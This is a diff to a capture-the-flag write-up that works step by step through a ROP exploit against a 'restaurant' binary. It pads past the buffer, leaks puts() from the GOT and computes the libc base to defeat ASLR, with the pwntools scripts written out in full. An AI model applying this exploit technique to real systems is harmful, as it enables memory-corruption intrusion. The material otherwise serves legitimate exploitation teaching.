@@ -155,6 +155,142 @@ log.info(rop.dump())
 
 > OUTPUT
 
+![image](https://user-images.githubusercontent.com/70703371/218257055-3767fde7-96e3-480a-abaf-37319d935642.png)
+
+
+22. We can see it's successfully aligned by seeing our last instruction offset is 0x0038 and every offset differences is 8 bytes.
+23. This means that each 64-bits instruction is 8 bytes.
+24. Well this causing our ROP chain exploit fill up to 0x40 bytes.
+25. Next, we need to get the leaked ASLR `puts()` for libc used in the remote server.
+26. We can get that, simply by sending our first ROP payload first which are returning to the `fills()` function again, then ignore the empty space printed to us, we can add `.recvuntil(b'\n')`.
+27. After ignoring the empty space, the program printed out this.
+
+![image](https://user-images.githubusercontent.com/70703371/218257657-b7d39d66-e28c-4918-afa7-a68e88c5bafa.png)
+
+
+28. Then it quits.
+29. Looking at the decompiled binary, it's the last statement there.
+
+![image](https://user-images.githubusercontent.com/70703371/218257694-f8889adf-9675-49e7-aca7-d2fb5f8bbdec.png)
+
+
+30. We can get the leaked `puts()` address, by adding `.recvuntil(b'\n')` again then add this one line script to get the leaked `puts()` address.
+
+```py
+leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
+```
+
+31. Let's run the script again.
+
+> Got the leaked
+
+![image](https://user-images.githubusercontent.com/70703371/218257855-b8c6a626-60ab-4f43-b663-ba9a8d33f1f8.png)
+
+
+> THE SCRIPT SO FAR
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+exe = './restaurant'
+libc_library = './libc.so.6'
+elf = context.binary = ELF(exe, checksec=False)
+libc = context.binary = ELF(libc_library, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+offsetRsp = b'A' * 40
+rop = ROP(elf) 
+
+rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
+rop.call(elf.plt['puts'], [elf.got['puts']])
+rop.call((rop.find_gadget(['ret']))[0]) 
+rop.call(elf.sym['fill']) 
+ropGetlibcaslr_addr = offsetRsp + rop.chain()
+log.info(rop.dump()) 
+
+sh.sendlineafter(b'>', b'1')
+
+sh.sendlineafter(b'>', ropGetlibcaslr_addr) 
+sh.recvuntil(b'\n')
+sh.recvuntil(b'\n')
+leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
+info('leaked puts() address: %#x', leakedputsLibc)
+```
+
+32. The next step is find the correct libc library used, but since they gave us inside the zip file, then we have no worries about it, we can skip this step.
+33. Next we need to calculate & set the ASLR base address of Libc library used in the remote server.
+34. The formula is template, we can use:
+
+```
+libcBase = leaked puts() address in libc - libc offset for puts()
+```
+
+35. Then set the libc address to the base address we calculated, with this our ROP payload shall reference to the correct offset/address meant for the remote server.
+
+> THE SCRIPT SO FAR
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+exe = './restaurant'
+libc_library = './libc.so.6'
+elf = context.binary = ELF(exe, checksec=False)
+libc = context.binary = ELF(libc_library, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+offsetRsp = b'A' * 40
+rop = ROP(elf) 
+
+rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
+rop.call(elf.plt['puts'], [elf.got['puts']])
+rop.call((rop.find_gadget(['ret']))[0]) 
+rop.call(elf.sym['fill']) 
+ropGetlibcaslr_addr = offsetRsp + rop.chain()
+log.info(rop.dump()) 
+
+sh.sendlineafter(b'>', b'1')
+
+sh.sendlineafter(b'>', ropGetlibcaslr_addr) 
+sh.recvuntil(b'\n')
+sh.recvuntil(b'\n')
+leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
+info('leaked puts() address: %#x', leakedputsLibc)
+
+libcBase = leakedputsLibc - libc.sym['puts']
+info('libcBase: %#x', libcBase)
+
+libc.address = libcBase
+```
+
+> OUTPUT 
+
+![image](https://user-images.githubusercontent.com/70703371/218258192-2f28b65f-a907-47bc-9b54-66e00a69d712.png)
+
+
+
+
 
 
 > THE SCRIPT
